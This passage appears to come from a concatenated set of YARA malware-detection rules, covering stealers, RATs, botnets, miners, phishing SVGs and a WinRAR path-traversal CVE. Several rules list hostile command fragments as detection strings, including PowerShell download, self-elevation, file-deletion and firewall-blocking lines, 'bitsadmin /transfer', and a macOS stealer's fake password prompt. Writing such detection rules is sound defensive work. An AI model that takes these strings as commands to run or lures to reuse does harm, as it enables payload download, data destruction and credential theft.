        date = "2026-02-05"
        yarahub_reference_md5 = "3d4ebdfc02146e6df1784a4ebd7621ff"
        yarahub_uuid = "5ec18f06-9675-403b-9ec0-fdf1e8444ac5"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        /* Miner identifier */
        $miner1 = "xmra64" ascii

        /* Common execution locations */
        $path1 = "/dev/shm" ascii
        $path2 = "/var/tmp" ascii

    condition:
        uint32(0) == 0x464c457f and
        filesize > 1MB and filesize < 5MB and
        $miner1 and
        1 of ($path*)
}


// ===== Source: yaraify-rules/BlackMoon.yar =====
rule BlackMoon {
    meta:
        author = "NDA0E"
	yarahub_author_twitter = "@NDA0E"
        date = "2024-10-20"
        description = "Detects BlackMoon"
	yarahub_uuid = "dc531539-588e-400b-8caa-a6e5af5ca6fc"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "0a554c494685e86c116fb212e5f38db7"
        malpedia_family = "win.krbanker"
    
    strings:
        $str0 = "blackmoon" ascii
        $str1 = "BlackMoon RunTime Error:" ascii
        
    condition:
	uint16(0) == 0x5a4d and 
        all of them
}


// ===== Source: yaraify-rules/Linux_SSHBruteforce_PRG_OLDTEAM.yar =====
rule Linux_SSHBruteforce_PRG_OLDTEAM
{
    meta:
        description = "Linux SSH brute-force toolkit (PRG / OLDTEAM), often masquerading as image"
        author = "noopoo/0XFF1"
        date = "2026-02-06"
        malware_family = "PRG-OLDTEAM"
        yarahub_license = "CC0 1.0"
        yarahub_uuid = "d3c74bf4-4cf9-4ff2-b6c6-c0767888e68c"
        reference = "MalwareBazaar upload"
        yarahub_reference_md5 = "d1ca004fbda5fedcd6583b09b679c581"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        /* Identity / Ego */
        $id1 = "PRG-oldTeam" ascii nocase
        $id2 = "OLDTEAM" ascii
        $id3 = "LET'S MAKE SOME ADMINS TO CRY" ascii nocase
        $id4 = "CREATED BY PRG" ascii


        /* Config / workflow */
        $cfg1 = "ips.lst" ascii
        $cfg2 = "pass.lst" ascii
        $cfg3 = "uidThreads" ascii
        $cfg4 = "usrThreads" ascii
        $cfg5 = "Banner grabber starting" ascii

        /* SSH / libssh2 internals */
        $ssh1 = "Invalid MAC received" ascii
        $ssh2 = "Channel open failure" ascii
        $ssh3 = "libssh2" ascii
        $ssh4 = "Unable to send channel data" ascii

        /* Packaging / structure */
        $pkg1 = ".stx/" ascii
        $pkg2 = "ustar" ascii
        $pkg3 = "gzip compressed data" ascii

    condition:
        /* Identity is mandatory */
        1 of ($id*) and

        /* Must show brute-force behavior */
        2 of ($cfg*) and
        2 of ($ssh*) and

        /* Plus archive / delivery context */
        1 of ($pkg*)
}


// ===== Source: yaraify-rules/BatModifier1.yar =====
rule BatModifier1
{
    meta:
        author = "Madhav"
        description = "This is a bat file which is setup a game. 49509"
        date = "2025-05-10"
	yarahub_reference_md5 = "79a546f11d5ed65736735ba86cb95213"
	yarahub_uuid = "fb799bc3-fe63-40cd-804c-28a821d99c5b"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
    
    strings:
        $mal1 = "PowerShell -Command \"Start-Process '%~f0' -Verb runAs\""
        $mal2 = "net session"
        $mal3 = "powershell -Command \"Invoke-WebRequest -Uri"
        $mal4 = "%SystemRoot%\\System32\\drivers\\etc\\hosts"
        $mal5 = "netsh advfirewall firewall add rule"
        $mal6 = "dir=out action=block remoteip="
	$mal7 = "%SystemRoot%\\System32\\curl.exe"
	$mal8 = "shell \"su -c 'id'\" | find \"uid=0(root)\""
	$mal9 = "tinyurl.com"
	$mal10 = "TaskKill /F /IM"
	$mal11 = "reg delete"
	$mal12 = "rd /s /q"
	$mal13 = "rd /q /s"
	$mal14 = "copy /y"
	$mal15 = "del /f"
	$mal16 = "del /s"
	$mal17 = "del /q"
    
    condition:
        all of ($mal1, $mal2, $mal3, $mal4, $mal5, $mal6, $mal7, $mal8) and
    	2 of ($mal9, $mal10, $mal11, $mal12, $mal13, $mal14, $mal15, $mal16, $mal17)
}


// ===== Source: yaraify-rules/rondodox_elf_multiarch.yar =====
rule rondodox_elf_multiarch
{
    meta:
        description               = "Detects RondoDox (Rondo) botnet ELF multi architecture variants"
        author                    = "Anish Bogati"
        date                      = "2025-12-08"

        yarahub_reference_md5     = "8735262237764f6bb3c233c8c987bf68"
        yarahub_uuid              = "d1cf7e9e-4f3c-4a9c-9f85-5f8e9c9b7b42"
        yarahub_license           = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"

        malware_family            = "RondoDox"
        reference                 = "https://bazaar.abuse.ch/sample/3b02c502a23b26e4d76850cd524041ae16d282431f62a2c07564cf1c3d29a9d5/"

    strings:
        $email1  = "rondo2012@atomicmail.io" ascii
        $email2  = "bang2013@atomicmail.io" ascii
        $ua      = "User-Agent: rondo" ascii
        $ssh     = "SSH-2.0-MoTTY_Release_0.82" ascii
        $persist = "rondo:345:once:" ascii
        $cmd     = "qconnect0x0" ascii
        $init    = "# Provides:          rondo" ascii

    condition:
        3 of ($email1, $email2, $ua, $ssh, $persist, $cmd, $init)
}


// ===== Source: yaraify-rules/botnet_dayzddos.yar =====
rule botnet_dayzddos {
    meta:
        author = "NDA0E"
        date = "2024-05-11"
        description = "dayzddos botnet"
        yarahub_uuid = "fa9ae8db-5393-4554-9fec-da031bf6cb23"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "7ac9673e951d038c2c10c230393b6f0a"
    strings:
        $dayzddos = "dayzddos" ascii
    condition:
        uint16(0) == 0x457f and all of them
}


// ===== Source: yaraify-rules/win32_younglotus.yar =====
rule win32_younglotus {
    meta:
        author = "Reedus0"
        description = "Rule for detecting YoungLotus malware"
        date = "2024-07-08"
        yarahub_reference_link = "https://habr.com/ru/articles/827184/"
        yarahub_reference_link = "https://malpedia.caad.fkie.fraunhofer.de/details/win.younglotus"
        yarahub_reference_md5 = "74D876023652002FC403052229ADC44E"
        yarahub_uuid = "6754bc2a-adc1-4970-a04d-561098812946"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        malpedia_family = "win.younglotus"
        version = "2"
    strings:
        $string_0 = "%s:%d:%s"
        $string_1 = "SYSTEM\\CurrentControlSet\\Services\\"
        $string_2 = "WinSta0\\Default"
        $string_3 = "%4d-%.2d-%.2d %.2d:%.2d"
        $string_4 = "%d*%sMHz"
        $string_5 = "Win7"
        $string_6 = "Shellex"
        $string_7 = "%s%s%s%s%s%s"
        $string_8 = "AVtype_info"
    condition:
        uint16(0) == 0x5A4D and 4 of them and filesize < 300KB
}


// ===== Source: yaraify-rules/stealc_ioc_hifi.yar =====
rule stealc_ioc_hifi {
    meta:
        author = "manb4t"
        description = "Simple string rule to identify current stealc samples"
        date = "2024-04-28"
        yarahub_author_twitter = "@knappresearchlb"
        yarahub_reference_md5 = "fe1fa198626701a72893c05b5e3c7d0c"
        sha256 = "93f357d221fc7f72bec7195e11c8a00b9e128448850a88ca66c8cc95fa47272f"
        yarahub_uuid = "f695b517-b316-4f57-9254-dbe90d4c5215"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        malpedia_family = "win.stealc"
    strings:
        $av1 = ".?AVexception@std@@" nocase ascii wide
        $av2 = ".?AVtype_info@@" nocase  ascii wide
        $av3 = ".?AVout_of_range@std@@" nocase  ascii wide
        $av4 = ".?AVlength_error@std@@"  nocase  ascii wide
        $av5 = ".?AVlogic_error@std@@" nocase ascii wide
        $av6 = ".?AVbad_alloc@std@@" nocase ascii wide
        $av7 = ".?AV_Iostream_error_category@std@@" nocase ascii wide
        $av8 = ".?AV_System_error_category@std@@" nocase ascii wide
        $av9 = ".?AVbad_exception@std@@" nocase ascii wide
        $av10 = ".?AVerror_category@std@@" nocase ascii wide
        $av11 = ".?AV_Generic_error_category@std@@" nocase ascii wide
        $genstr1 = "kernel32.dll" nocase ascii wide
        $genstr2 = "1#SNAN" nocase ascii wide
        $genstr3 = "1#QNAN" nocase ascii wide
        $stru1 = "msimg32.dll" nocase wide
        $stru2 = "mscoree.dll" nocase wide
        $stru3 = "USER32.DLL" nocase wide
        $stru4 = "Copyright (C) 2022, Cry" nocase wide
        $pdb = ".pdb" nocase ascii wide         
    condition:
        uint16(0) == 0x5a4d and
        all of ($av*) and
        2 of ($genstr*) and
        4 of ($stru*) and $pdb
}


// ===== Source: yaraify-rules/DetectGoMethodSignatures.yar =====
rule DetectGoMethodSignatures {
    meta:
        description = "Detects Go method signatures in unpacked Go binaries"
        author = "Wyatt Tauber"
        date = "2024-12-03"
        yarahub_reference_md5 = "c8820b30c0eddecf1f704cb853456f37"
        yarahub_uuid = "2a5e4bcf-3fcb-4bc9-9767-352e8d3307d6"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
    strings:
        $go_signature = /[a-zA-Z_][a-zA-Z0-9_]*\.\(\*[a-zA-Z_][a-zA-Z0-9_]*\)\.[a-zA-Z_][a-zA-Z0-9_]*/

    condition:
        $go_signature
}


// ===== Source: yaraify-rules/win_gcleaner_de41.yar =====
rule win_gcleaner_de41 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-05-29"
        description               = "detects GCleaner"
        hash1_md5                 = "8151e61aec021fa04bce8a30ea052e9d"
        hash1_sha1                = "4b972d2e74a286e9663d25913610b409e713befd"
        hash1_sha256              = "868fceaa4c01c2e2ceee3a27ac24ec9c16c55401a7e5a7ca05f14463f88c180f"
        hash2_md5                 = "7526665a9d5d3d4b0cfffb2192c0c2b3"
        hash2_sha1                = "13bf754b44526a7a8b5b96cec0e482312c14838c"
        hash2_sha256              = "bb5cd698b03b3a47a2e55a6be3d62f3ee7c55630eb831b787e458f96aefe631b"
        hash3_md5                 = "a39e68ae37310b79c72025c6dfba0a2a"
        hash3_sha1                = "ae007e61c16514a182d21ee4e802b7fcb07f3871"
        hash3_sha256              = "c5395d24c0a1302d23f95c1f95de0f662dc457ef785138b0e58b0324965c8a84"
        malpedia_family           = "win.gcleaner"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "8151e61aec021fa04bce8a30ea052e9d"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "de41ff50-28a7-4a09-86dc-f737f8858354"

    strings:
        $accept = "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1"
        $accept_lang = "Accept-Language: ru-RU,ru;q=0.9,en;q=0.8"
        $accept_charset = "Accept-Charset: iso-8859-1, utf-8, utf-16, *;q=0.1"
        $accept_encoding = "Accept-Encoding: deflate, gzip, x-gzip, identity, *;q=0"

        $unkown = "<unknown>"
        $cmd1 = "\" & exit"
        $cmd2 = "\" /f & erase "
        $cmd3 = "/c taskkill /im \""

        $anti1 = " Far "
        $anti2 = "roxifier"
        $anti3 = "HTTP Analyzer"
        $anti4 = "Wireshark"
        $anti5 = "NetworkMiner"

        $mix1 = "mixshop"
        $mix2 = "mixtwo"
        $mix3 = "mixnull"
        $mix4 = "mixazed"

    condition:
        uint16(0) == 0x5A4D and
        15 of them
}


// ===== Source: yaraify-rules/OdysseyStealer.yar =====
rule OdysseyStealer
{
	meta:
		author = "Still"
		component_name = "OdysseyStealer"
		date = "2025-07-12"
		description = "attempts to match the strings found in OdysseyStealer"
		yarahub_author_twitter = "@AzakaSekai_"
		yarahub_license = "CC BY-NC 4.0"
		yarahub_reference_md5 = "e807e2bf37ff5a8b1aa7f1d239564647"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_uuid = "747a2aea-7ce7-4855-965e-dacefda2be4e"
	strings:
		$str_1 = "/tmp/lovemrtrump/"
		$str_2  ="\\\"/.pwd\\\""
		$str_3 = "\\\"<h1>Notes Count: \\\""
		$str_4 = "\\\"Required Application Helper. Please enter device password to continue.\\\""
		$str_5 = "\"buildid: $BUILDID$"
		$str_6 = "\\\"finder/saf1\\\""
		$str_7 = "/tmp/socks\\\""
		$str_8 = " to do shell script \\\"dscl . authonly \\\" & quoted form of"
		$str_9 = "rm /tmp/out.zip\\\""
	condition:
		3 of them
}


// ===== Source: yaraify-rules/ELF_RAT_Bifrost_March2024.yar =====
rule ELF_RAT_Bifrost_March2024 {
    meta:
        Description = "Detects x86 based Version of Bifrost RAT Targeting Linux"
        author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
        Reference = "https://unit42.paloaltonetworks.com/new-linux-variant-bifrost-malware/"
        Hash = "8e85cb6f2215999dc6823ea3982ff4376c2cbea53286e95ed00250a4a2fe4729"
        date = "2024-03-04"
        yarahub_author_twitter = "@RustyNoob619"
        yarahub_reference_md5 = "e527b3f10217c1d663e567e041947033"
        yarahub_uuid = "78f51ca6-2127-4e25-a710-2479388c1504"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        malpedia_family = "elf.bifrost"
   
   strings:
        $msg1 = "begin st=socket(..)"
        $msg2 = "ip=%s dns_server=%s"
        $msg3 = "sleep sleeptime_1 %ds"
        $msg4 = "recvData timeout :%d"
        $msg5 = "send data %d : %s"
        $msg6 = "restlen=%d"

        $cmd1 = "getpwuid_r"
        $cmd2 = "passwd"
        $cmd3 = "shadow"
        $cmd4 = "search cache=%s"
        $cmd5 = "lookup in file=%s"

        $dir1 = "/proc/self/maps"
        $dir2 = "/usr/share/zoneinfo"
        $dir3 = "/etc/nsswitch.conf"
        $dir4 = "/var/run/.nscd_socket"
        $dir5 = "/etc/suid-debug"
        $dir6 = "/usr/lib/gconv"
        $dir7 = "/usr/lib/locale/locale-archive"
        $dir8 = "/etc/resolv.conf"
        $dir9 = "/etc/ld.so.cache"
        $dir10 = "/proc/self/exe"

        //$_c2 = "168.95.1.1"
        $wide = "jjjjjj" wide
        
   condition:
         uint32be(0) == 0x7F454C46 //ELF
         and 4 of ($msg*)
         and 3 of ($cmd*)
         and 6 of ($dir*)
         and $wide

 }


// ===== Source: yaraify-rules/Detect_AnyDesk_Installer.yar =====
rule Detect_AnyDesk_Installer {
    meta:
        description = "Detects malicious Python scripts that install AnyDesk"
        author = "Sn0wFr0$t"
        reference = "Custom rule for detecting InvisibleFerret AnyDesk-related malicious scripts"
        severity = "high"
		date = "2024-11-16"
		yarahub_uuid = "8fdfae1c-6926-4e55-b977-1e98098431f5"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "3e09edd4d8f998330c7c99062df1e5d7"

    strings:
        $pwd_hash = "ad.anynet.pwd_hash=" nocase
        $pwd_salt = "ad.anynet.pwd_salt=" nocase
        $token_salt = "ad.anynet.token_salt=" nocase
        $pip_install = "sys.executable,'-m','pip','install','psutil'" nocase

    condition:
        all of them
}


// ===== Source: yaraify-rules/golang_bin_JCorn_CSC846.yar =====
rule golang_bin_JCorn_CSC846 {

	meta:
		description = "CSC-846 Golang detection ruleset"
		author = "Justin Cornwell"
		date = "2024-12-09"
		yarahub_reference_md5 = "c8820b30c0eddecf1f704cb853456f37"
		yarahub_license = "CC0 1.0"
		yarahub_uuid = "b684bc3e-c106-4636-b9b7-f0a90e0b45d7"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
	strings:
		$string_go_build = "Go build" ascii wide
		$string_runtime = "runtime" ascii wide

	condition:
		uint16(0) == 0x5a4d // MZ header
		and any of them

}


// ===== Source: yaraify-rules/phishing_win_tykit_svg.yar =====
rule phishing_win_tykit_svg {
    meta:
        version = "1.0"
        description = "Detects Tykit phishing .svg"
        author = "Zara Chacha"
        source = "https://any.run/cybersecurity-blog/tykit-technical-analysis/"
        creation_date = "2025-10-23"
        yarahub_reference_md5 = "7c8b761ec97551d76198ae527c77bfb2"
        yarahub_uuid = "417db8be-478a-4445-9919-1d25ec2100bf"
        yarahub_license = "CC0 1.0" 
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

    strings:
        $s1 = "http://www.w3.org/2000/svg"
        $s2 = "isMobile()"
        $s3 = "parseInt"
        $s4 = "charCodeAt"
        $s5 = "fromCodePoint"
        $s6 = "['\\x65', '\\x76', '\\x61', '\\x6c'].join('')"
        $s7 = "padding" nocase

    condition:
        all of them    
}


// ===== Source: yaraify-rules/UNKNOWN_News_Penguin_Feb2024.yar =====
rule UNKNOWN_News_Penguin_Feb2024 {
    meta:
        Description = "Detects an unknown File Type that was part of the tooling used by News Penguin to target orgs in Pakistan"
        author = "Yashraj Solanki - Cyber Threat Intelligence Analyst at Bridewell"
        Credits = "Is Now on VT! for notification of the malware sample"
        Reference = "https://blogs.blackberry.com/en/2023/02/newspenguin-a-previously-unknown-threat-actor-targets-pakistan-with-advanced-espionage-tool"
        Hash = "538bb2540aad0dcb512c6f0023607382456f9037d869b4bf00bcbdb18856b338"
        date = "2024-02-27"
        yarahub_author_twitter = "@RustyNoob619"
        yarahub_reference_md5 = "861b80a75ecfb083c46f6e52277b69a9"
        yarahub_uuid = "45cc6729-fe81-4055-ba74-40f5a17d4fae"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"

strings:
    $penguin = "penguin"
    condition:
        #penguin > 100       
     
 }


// ===== Source: yaraify-rules/botnet_RyM.yar =====
rule botnet_RyM {
    meta:
        author = "NDA0E"
        date = "2024-07-22"
	description = "RyM botnet"
        yarahub_uuid = "4aaa9b2f-992f-4416-a119-5a1c4dd63b1c"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "6dde652b28f73f978e834412b835a740"
    strings:
	$RyM = "RyM..." ascii
	$RyMGang = "RyMGang" ascii
    condition: 
	uint16(0) == 0x457f and any of them
}


// ===== Source: yaraify-rules/MALWARE_OneNote_Delivery_Jan23.yar =====
rule MALWARE_OneNote_Delivery_Jan23
{
	meta:
		author = "SECUINFRA Falcon Team (@SI_FalconTeam)"
		description = "Detects suspicious Microsoft OneNote files used to deliver Malware"
		reference = "https://twitter.com/James_inthe_box/status/1615421130877329409"
		date = "2023-01-19"
		tlp = "CLEAR"
		hash0 = "18af397a27e58afb901c92f37569d48e3372cf073915723e4e73d44537bcf54d"
		hash1 = "de30f2ba2d8916db5ce398ed580714e2a8e75376f31dc346b0e3c898ee0ae4cf"
		hash2 = "bfc979c0146d792283f825f99772370f6ff294dfb5b1e056943696aee9bc9f7b"
		hash3 = "e0d9f2a72d64108a93e0cfd8066c04ed8eabe2ed43b80b3f589b9b21e7f9a488"
		hash4 = "3f00a56cbf9a0e59309f395a6a0b3457c7675a657b3e091d1a9440bd17963f59"
		yarahub_reference_md5 = "65b3b312dfaf25a72e9171271909357e"
		yarahub_uuid = "1b3f4b6b-9dd4-4080-af23-195078bf3abe"
		yarahub_license = "CC BY 4.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_author_twitter = "@SI_FalconTeam"

	strings:
		// HTA
		$hta = "hta:application" nocase
		$script1 = "type=\"text/vbscript\""
		$script2 = "language=\"VBScript\""
		
		// Powershell
		$powershell = "powershell" nocase
		$startProc = "Start-Process -Filepath"
		$webReq = "Invoke-WebRequest -Uri"
		$bitsadmin = "bitsadmin /transfer"
		
		//WScript
		$wscript = "WScript.Shell" nocase
		$autoOpen = "Sub AutoOpen()"
		$root = "GetObject(\"winmgmts:\\.\\root\\cimv2\")"
		$wsfExt = ".wsf" ascii wide
		$vbsExt = ".vbs" ascii wide

		// Batch
		$cmd = "cmd /c" nocase
		$batch = "@echo off"
		$batExt = ".bat" ascii wide
		$delExit = "(goto) 2>nul & del \"%~f0\"..exit /b"

		// PE Files
		$dosString = "!This program cannot be run in DOS mode"
		$exeExt = ".exe" ascii wide
		
		// Image Lure
		$imageFile = "button_click-to-view-document.png" wide
		$click = "click to view document" nocase wide
		
		// Leaked File Paths
		$path1 = "C:\\Users\\My\\OneDrive\\Desktop" wide
		$path2 = "C:\\Users\\Administrator\\Documents\\Dove" wide
		$path3 = "C:\\Users\\julien.galleron\\Downloads" wide
	
	condition:
		uint32be(0x0) == 0xE4525C7B
		and 3 of them
}


// ===== Source: yaraify-rules/SelfExtractingRAR.yar =====
rule SelfExtractingRAR {
  meta:
    author = "Xavier Mertens"
    description = "Detects an SFX archive with automatic script execution"
    date = "2023-05-17"
    yarahub_author_twitter = "@xme"
    yarahub_author_email = "xmertens@isc.sans.edu"
    yarahub_reference_link = "https://isc.sans.edu/diary/rss/29852"
    yarahub_uuid = "bcc4ceab-0249-43af-8d2a-8a04d5c65c70"
    yarahub_license =  "CC0 1.0"
    yarahub_rule_matching_tlp =  "TLP:WHITE"
    yarahub_rule_sharing_tlp =  "TLP:WHITE"
    yarahub_reference_md5= "7792250c87624329163817277531a5ef" 

    strings:
        $exeHeader = "MZ"
        $rarHeader = "Rar!" wide ascii
        $sfxSignature = "SFX" wide ascii
        $sfxSetup = "Setup=" wide ascii

    condition:
       $exeHeader at 0 and $rarHeader and $sfxSignature and $sfxSetup
}


// ===== Source: yaraify-rules/xlsb_adj.yar =====
rule xlsb_adj 
{
    meta:
        description = "Regla para correo malicioso (adjunto)"
        author = "Nerio Rodriguez"
        date = "2024-04-15"
	yarahub_uuid = "d8e0bae3-306f-4e95-bb63-49021ccaf56c"
        yarahub_reference_md5 = "c2293ce082da26ff050854765bcd0870"
	yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
    strings:
        $s1 = "Payment Remittance Advice_000000202213.xlsb" wide ascii
    condition:
        all of them
}


// ===== Source: yaraify-rules/win_xwormmm_s1_6f74.yar =====
rule win_xwormmm_s1_6f74 {

    meta:
        author                    = "Johannes Bader"
        date                      = "2022-11-13"
        description               = "detects unpacked Xwormmm samples"
        hash1_md5                 = "6005e1ccaea62626a5481e09bbb653da"
        hash1_sha1                = "74138872ec0d0791b7f58eda8585250af40feaf9"
        hash1_sha256              = "7fc6a365af13150e7b1738129832ebd91f1010705b0ab0955a295e2c7d88be62"
        tlp                       = "TLP:WHITE"
        version                   = "v1.0"
        yarahub_author_email      = "yara@bin.re"
        yarahub_author_twitter    = "@viql"
        yarahub_license           = "CC BY-SA 4.0"
        yarahub_reference_md5     = "6005e1ccaea62626a5481e09bbb653da"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp  = "TLP:WHITE"
        yarahub_uuid              = "6f74e598-0f7c-42f4-9730-1925d1b08ebe"

    strings:
        $str_01 = "Mutexx"
        $str_02 = "USBS"
        $str_03 = "_appMutex"
        $str_04 = "dTimer2"
        $str_05 = "dosstu"
        $str_06 = "nameee"
        $str_07 = "ruta"
        $str_08 = "usbSP"
        $str_09 = "GetEncoderInfo"
        $str_10 = "AppendOutputText"
        $str_11 = "capCreateCaptureWindowA"
        $str_12 = "capGetDriverDescriptionA"
        $str_13 = "MyProcess_ErrorDataReceived"
        $str_14 = "MyProcess_OutputDataReceived"
        $str_15 = "STOBS64"
        $str_16 = "keybd_event"
        $str_17 = "AES_Decryptor"
        $str_18 = "AES_Encryptor"
        $str_19 = "tickees"
        $str_20 = "INDATE"
        $str_21 = "GetHashT"
        $str_22 = "isDisconnected"

        $str_23   = "PING?" wide
        $str_24   = "IsInRole" wide
        $str_25   = "Select * from AntivirusProduct" wide
        $str_26   = "FileManagerSplitFileManagerSplit" wide
        $str_27   = "\nError: " wide
        $str_28   = "[Folder]" wide

        $str_29    = "XKlog.txt" wide
        $str_30    = "<Xwormmm>" wide
        $str_32    = "GfvaHzPAZuTqRREB" wide

    condition:
        uint16(0) == 0x5A4D and
        (
            20  of ($str*)
        )
}


// ===== Source: yaraify-rules/CVE_2025_8088_rar_ADS_traversal.yar =====
rule CVE_2025_8088_rar_ADS_traversal {
	meta:
		description = "Detects CVE-2025-8088 WinRAR NTFS ADS path traversal exploitation"
		author = "Travis Green <travis.green@corelight.com>"
		reference = "https://www.welivesecurity.com/en/eset-research/update-winrar-tools-now-romcom-and-others-exploiting-zero-day-vulnerability/"
		date = "2025-08-11"
		version = "1.0"
		hash1 = "107f3d1fe28b67397d21a6acca5b6b35def1aeb62a67bc10109bd73d567f9806"
		tlp = "WHITE"
		yarahub_reference_md5 = "df9cfd04d8cda6df8f7263af54f9e5b1"
		yarahub_author_twitter = "@travisbgreen"
		yarahub_author_email = "travis.green@corelight.com"
		yarahub_reference_link = "https://travisgreen.net/2025/08/11/CVE-2025-8088.html"
		yarahub_uuid = "b9a882e6-efc0-4d67-afe5-ca1a42adbef4"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
	strings:
		$x1 = "STM" fullword ascii
		$x2 = "..\\\\" fullword ascii
		$x3 = /STM..\x3a[^\x00]*\x2e\x2e\x5c/ ascii
	condition:
		uint16(0) == 0x6152 and 3 of ($x*)
}


// ===== Source: yaraify-rules/SUSP_Doc_WordXMLRels_May22.yar =====
rule SUSP_Doc_WordXMLRels_May22 {
   meta:
      description = "Detects a suspicious pattern in docx document.xml.rels file as seen in CVE-2022-30190 / Follina exploitation"
      author = "Tobias Michalski, Christian Burkard, Wojciech Cieslak"
      date = "2022-05-30"
      yarahub_reference_md5 = "5f15a9b76ad6ba5229cb427ad7c7a4f6"
      yarahub_uuid = "a9aad367-682e-440c-8732-dc414274b5c3"
      yarahub_license = "CC0 1.0"
      yarahub_rule_matching_tlp = "TLP:WHITE"
      yarahub_rule_sharing_tlp = "TLP:WHITE"
	  techniques = "File and Directory"
      modified = "2022-06-02"
      reference = "https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e"
      hash = "62f262d180a5a48f89be19369a8425bec596bc6a02ed23100424930791ae3df0"
      score = 70
   strings:
      $a1 = "<Relationships" ascii
      $a2 = "TargetMode=\"External\"" ascii

      $x1 = ".html!" ascii
      $x2 = ".htm!" ascii
   condition:
      filesize < 50KB
      and all of ($a*)
      and 1 of ($x*)
}


// ===== Source: yaraify-rules/SUSP_NET_Shellcode_Loader_Indicators_Jan24.yar =====
rule SUSP_NET_Shellcode_Loader_Indicators_Jan24 {
    meta:
        description = "Detects indicators of shellcode loaders in .NET binaries"
        author = "Jonathan Peters"
        date = "2024-01-11"
        reference = "https://github.com/Workingdaturah/Payload-Generator/tree/main"
        hash = "c48752a5b07b58596564f13301276dd5b700bd648a04af2e27d3f78512a06408"
        score = 65
        yarahub_uuid = "eda4aae4-e33a-4a8c-9992-7979609bbde8"
        yarahub_license = "CC BY 4.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
        yarahub_reference_md5 = "f03b6f7bff89bcba31d69706d3644350"
    strings:
        $sa1 = "VirtualProtect" ascii
        $sa2 = "VirtualAlloc" ascii
        $sa3 = "WriteProcessMemory" ascii
        $sa4 = "CreateRemoteThread" ascii
        $sa5 = "CreateThread" ascii
        $sa6 = "WaitForSingleObject" ascii
        $x = "__StaticArrayInitTypeSize=" ascii
    condition:
        uint16 ( 0 ) == 0x5a4d and 3 of ( $sa* ) and #x == 1
}


// ===== Source: yaraify-rules/AppLaunch.yar =====
rule AppLaunch
{
	meta:
		author = "iam-py-test"
		description = "Detect files referencing .Net AppLaunch.exe"
		example_file = "ba85b8a6507b9f4272229af0606356bab42af42f5ee2633f23c5e149c3fb9ca4"
		new_example_file = "cda99e504a122208862739087cf16b4838e9f051acfcbeb9ec794923b414c018"
		in_the_wild = true
		// yarahub data
		date = "2022-11-17"
		yarahub_uuid = "613f8ac7-a5f3-4167-bbcd-4dbfd4c8ba67"
		yarahub_license = "CC0 1.0"
		yarahub_rule_matching_tlp = "TLP:WHITE"
		yarahub_rule_sharing_tlp = "TLP:WHITE"
		yarahub_reference_md5 = "7dbfe0186e52ef2da13079f6d5b800d7"
	strings:
		$filelocation = "C:\\Windows\\Microsoft.NET\\Framewor"
		$applaunch = "\\AppLaunch.exe" nocase
	condition:
		$filelocation and $applaunch
}


// ===== Source: yaraify-rules/ZeuS.yar =====
rule ZeuS {
    meta:
        author = "NDA0E"
        yarahub_author_twitter = "@NDA0E"
        date = "2024-09-20"
        description = "Detects ZeuS"
        yarahub_uuid = "5f4ca030-2799-47d0-907a-942f84cff1c7"
        yarahub_license = "CC0 1.0"
        yarahub_rule_matching_tlp = "TLP:WHITE"
        yarahub_rule_sharing_tlp = "TLP:WHITE"
